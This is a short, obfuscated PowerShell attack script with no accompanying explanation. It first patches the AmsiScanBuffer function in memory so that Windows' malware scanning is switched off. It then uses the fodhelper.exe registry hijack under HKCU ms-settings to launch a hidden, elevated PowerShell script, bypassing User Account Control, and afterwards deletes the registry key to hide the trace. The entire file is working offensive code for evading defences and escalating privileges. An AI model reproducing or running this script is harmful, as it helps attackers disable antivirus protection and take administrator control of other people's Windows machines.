$64d1eab2022445c8add9ddb98b4b3f3d = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type -TypeDefinition $64d1eab2022445c8add9ddb98b4b3f3d -Language CSharp
$b = "a" + "m" + "s" + "i" + "." + "d" + "l" + "l"
$6abfe0e4869b46159cebdc75d97b094b = [Win32]::LoadLibrary($b)
$a = "Ams" + "iS" + "can" + "Buffer"
$cc145a30c76d4f6b892c6df7a1df7429 = [Win32]::GetProcAddress($6abfe0e4869b46159cebdc75d97b094b, $a)

#reg
$7859efa123b54e78ac59f7dd2d03d18f = 0
[Win32]::VirtualProtect($cc145a30c76d4f6b892c6df7a1df7429, [UIntPtr]::new(6), 0x40, [ref]$7859efa123b54e78ac59f7dd2d03d18f)

$de2316b8afef4af3aca39b4bdc42f0c7 = [Byte[]](0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($de2316b8afef4af3aca39b4bdc42f0c7, 0, $cc145a30c76d4f6b892c6df7a1df7429, 3)


$54acb7758fdc49e8bfc673a81c777705 = "HKCU:\Software\Classes\{0}\shell\open\command" -f ('ms-settings')
$20e5651b3f694af9b491ee05df4ac648 = "cmd /c start /min powershell -ep bypass -file C:\Users\thierry\Desktop\psehjwad\test_elevation.ps1"

New-Item $54acb7758fdc49e8bfc673a81c777705 -Force | Out-Null
Set-ItemProperty $54acb7758fdc49e8bfc673a81c777705 -Name "DelegateExecute" -Value ""
Set-ItemProperty $54acb7758fdc49e8bfc673a81c777705 -Name "(Default)" -Value $20e5651b3f694af9b491ee05df4ac648


Start-Process "cmd.exe" -ArgumentList "/c start fodhelper.exe" -WindowStyle Hidden


Start-Sleep 3
Remove-Item $54acb7758fdc49e8bfc673a81c777705 -Force -Recurse -ErrorAction SilentlyContinue
